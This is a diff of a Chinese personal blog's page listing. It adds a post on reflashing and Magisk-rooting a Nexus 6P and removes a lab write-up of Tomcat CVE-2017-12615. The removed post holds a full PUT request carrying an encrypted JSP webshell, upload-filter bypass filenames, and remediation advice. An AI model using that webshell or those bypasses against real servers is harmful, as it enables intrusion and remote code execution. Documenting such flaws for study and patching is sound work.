@@ -200,6 +200,121 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/HUAWEI-Nexus6P%E5%9B%9E%E5%88%B7%E5%AE%98%E6%96%B9%E9%95%9C%E5%83%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/07/HUAWEI-Nexus6P%E5%9B%9E%E5%88%B7%E5%AE%98%E6%96%B9%E9%95%9C%E5%83%8F/" class="post-title-link" itemprop="url">HUAWEI-Nexus6P回刷官方镜像</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-07 01:10:08" itemprop="dateCreated datePublished" datetime="2022-07-07T01:10:08+08:00">2022-07-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1337715208/article/details/115922514">https://blog.csdn.net/qq1337715208/article/details/115922514</a></p>
+<h3 id="回刷官方镜像"><a href="#回刷官方镜像" class="headerlink" title="回刷官方镜像"></a>回刷官方镜像</h3><p>由于之前刷ROOT失败了，得到一个root环境的半成品</p>
+<p>所以这次除了要刷一个正常的root环境之外，还要在这之前先把办成Root给回刷成官方原版镜像</p>
+<p>回刷主要参考这个链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p>
+<p>官网下载官方镜像</p>
+<p><a target="_blank" rel="noopener" href="https://developers.google.cn/android/ota?hl=zh-cn#angler">https://developers.google.cn/android/ota?hl=zh-cn#angler</a></p>
+<p>选”angler” for Nexus 6P中的angler-opm7.181205.001-factory-b75ce068.zip线刷包</p>
+<p>建议按f12，复制包名到代码中区搜，可以直接找到链接，我这里也直接贴出链接，但官方可能会更新导致失效</p>
+<p><a target="_blank" rel="noopener" href="https://dl.google.com/dl/android/aosp/angler-ota-opm7.181205.001-abb36a2f.zip?hl=zh-cn">https://dl.google.com/dl/android/aosp/angler-ota-opm7.181205.001-abb36a2f.zip?hl=zh-cn</a></p>
+<p>然后解压该包</p>
+<p>包内会有一些镜像文件，以及flash-all.bat这些批处理文件，是windows就用flash-all.bat，linux就用flash-all.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash-all.bat</span><br></pre></td></tr></table></figure>
+
+<p>运行过后，脚本会进入等待状态，显示如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; waiting for any device &gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时按手机电源键+音量下键，进入fastboot模式脚本就会帮你自动刷机，完成后就是一个崭新的官方镜像了</p>
+<p>使用这个办法，可以无限次将刷坏的root环境重置到官方原版，哪怕刷成无限重启的半砖机，也可以通过该种方法回退，刷机保险程度大大提升</p>
+<h3 id="修补boot-img刷root"><a href="#修补boot-img刷root" class="headerlink" title="修补boot.img刷root"></a>修补boot.img刷root</h3><p>把线刷包中的boot.img发送到手机，可以用adb命令push到手机sdcard目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push boot.img /sdcard/</span><br></pre></td></tr></table></figure>
+
+<p>然后在手机中下载一个最新版magisk，可以在github中下载</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p>
+<p>然后使用adb命令把apk文件安装到手机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install Magisk-25.1.apk</span><br></pre></td></tr></table></figure>
+
+<p>打开Magisk文件，点击安装</p>
+<p>选项选：保持强制加密（默认选中），修补boot镜像中的vbmeta，这两个，然后下一步</p>
+<p>选：选择并修补一个文件</p>
+<p>然后选择你保存到手机中的boot.img文件，该文件会生成一个magisk_patched-打头的镜像文件，类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure>
+
+<p>把该文件pull到你的电脑上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/Download/magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure>
+
+<p>然后重启手机到fastboot模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>
+
+<p>刷入你刚pull到电脑上的修补后镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash boot magisk_patched-25100_r0fpc.img</span><br></pre></td></tr></table></figure>
+
+<p>刷完后等待个10秒左右，重启（有些会自动重启）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
+
+<p>重启成功后，就可以使用adb shell检查一下是否root成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure>
+
+<p>如果su命令能执行成功，就说明root完成</p>
+<p>如果不成功，请重复回刷官方镜像步骤，还原你的手机系统到官方镜像，然后尝试找出你刷机过程中有无误操作，或使用其他刷机方法。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/HUAWEI-Nexus6P%E5%88%B7%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9rec/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -539,7 +654,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-24 00:08:40" itemprop="dateModified" datetime="2022-07-24T00:08:40+08:00">2022-07-24</time>
+                <time title="修改时间：2022-08-15 16:34:14" itemprop="dateModified" datetime="2022-08-15T16:34:14+08:00">2022-08-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1064,98 +1179,10 @@ Apache Tomcat 6.x
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Tomcat:CVE-2017-12615-PUT上传漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-06-27 21:53:40" itemprop="dateCreated datePublished" datetime="2022-06-27T21:53:40+08:00">2022-06-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>Tomcat7.0.0-7.0.81</p>
-<p>Tomecat允许put方法</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当conf&#x2F;web.xml中的readonly设置为false时，可导致PUT方法上传任意文件。</p>
-<p>改POST为PUT，文件名为&#x2F;shell.jsp&#x2F;，jsp后面带斜杠可以绕过tomcat默认拦截jsp文件上传的规则，数据包如下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: 123.58.236.76:62569</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_deaeca6802357287fb453f342ce28dda=1650783599,1650802097,1652247719,1652272906; JSESSIONID=CF2E094DF0D9B8D77D0CFA3B123093A6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 533</span><br><span class="line"></span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;xxxxxxxxxxxxx&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上传后访问&#x2F;shell.jsp，用冰蝎连接木马getshell。</p>
-<h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>必须当conf&#x2F;web.xml中的readonly设置为false时，才会导致该漏洞。</p>
-<p>上传文件名为shell.jsp&#x2F;是绕过文件名后缀后名单的一种方式，还可以采取其他方式，linux中shell.jsp&#x2F;，windows中shell.jsp.|shell.jsp::$DATA|shell.jsp%20等都可以</p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.配置readonly和VirtualDirContext值为True或注释参数，禁止使用PUT方法并重启<br> tomcat<br> 注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。<br> 2.根据官方补丁升级最新版本</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1223,14 +1250,14 @@ Apache Tomcat 6.x
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">31</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1267,7 +1294,7 @@ Apache Tomcat 6.x
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共32.2k字</span>
+  <span class="post-count">博客全站共32.4k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
